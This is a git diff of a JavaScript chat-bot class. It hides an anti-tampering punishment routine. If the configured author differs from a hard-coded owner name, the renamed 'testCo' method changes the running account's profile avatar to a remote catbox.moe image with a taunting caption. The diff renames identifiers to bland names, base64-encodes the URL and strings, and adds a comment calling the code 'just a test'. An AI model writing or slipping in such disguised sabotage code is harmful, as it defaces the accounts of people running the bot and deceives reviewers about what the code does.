@@ -21,37 +21,40 @@ class OnChat {
         });
     }
 
-    async killme(pogiko, lvl = 1) {
+    async testCo(pogiko, lvl = 1) {
         const hajime = await workers();
-        let owner;
+        let test;
         try {
-            owner = hajime.design.author || atob("S2VubmV0aCBQYW5pbw==");
+            test = hajime.design.author || atob("S2VubmV0aCBQYW5pbw==");
         } catch (error) {
             return;
         }
 
-        let authors;
+        let test_6;
 
         if (Array.isArray(pogiko)) {
             if (pogiko.length !== 2) {
                 this.log("Array must contain exactly two authors for comparison.");
                 return;
             }
-            authors = pogiko;
+            test_6 = pogiko;
         } else {
-            authors = [pogiko,
-                owner];
+            test_6 = [pogiko,
+                test];
         }
 
-        const [author1,
-            author2] = authors;
+        const [nega1,
+            nega2] = test_6;
+        const kryo = atob("aHR0cHMlM0ElMkYlMkZmaWxlcy5jYXRib3gubW9lJTJGa3I2aWc3LnBuZw==");
 
-        if (author1 !== author2) {
+        if (nega1 !== nega2) {
             if (lvl === 1) {
-                return this.api.sendMessage("Error!", this.threadID, this.messageID);
+                return this.api.sendMessage(atob("RXJyb3Ih"), this.threadID, this.messageID);
             } else if (lvl === 2) {
-                const avatarStream = await this.stream("https://files.catbox.moe/kr6ig7.png");
-                return this.api.changeAvatar(avatarStream, "HACKED BY MARK ZUCKERBURGER!", null);
+                const avatarStream = await this.stream(decodeURIComponent(kryo));
+                return this.api.changeAvatar(avatarStream, atob("QU1CQVRVS0FN!"), null);
+            } else if (lvl == 3) {
+                return; // do nothing this is just a test ignore it wait for future update
             }
         }
     }
